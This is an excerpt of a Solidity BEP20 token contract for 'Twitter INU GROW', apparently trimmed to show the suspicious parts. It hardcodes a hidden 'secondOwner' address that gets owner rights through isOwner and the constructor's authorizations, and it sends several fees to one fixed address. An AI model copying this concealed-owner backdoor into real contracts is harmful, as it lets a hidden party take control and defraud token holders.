...
abstract contract Auth {
    ...
    address secondOwner = 0x990476A3AbD74c1943bC94B75b526a2218A1E6f6;
    ...
    constructor(address _owner) {
        ...
        authorizations[secondOwner] = true;
    }
    ...
    function isOwner(address account) public view returns (bool) {
        return account == owner || account ==  secondOwner;
    }
...
contract TwitterINUGrow is BEP20, Auth {
    ...
    string public constant name = "Twitter INU GROW";
    string public constant symbol = "$TGROW";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xf9f16fce096f062C21C09976490AA87248ee6A4a;
        rewardFeeReceiver = msg.sender;
        developmentFeeReceiver = 0xf9f16fce096f062C21C09976490AA87248ee6A4a;
        devFeeReceiver = 0xf9f16fce096f062C21C09976490AA87248ee6A4a;
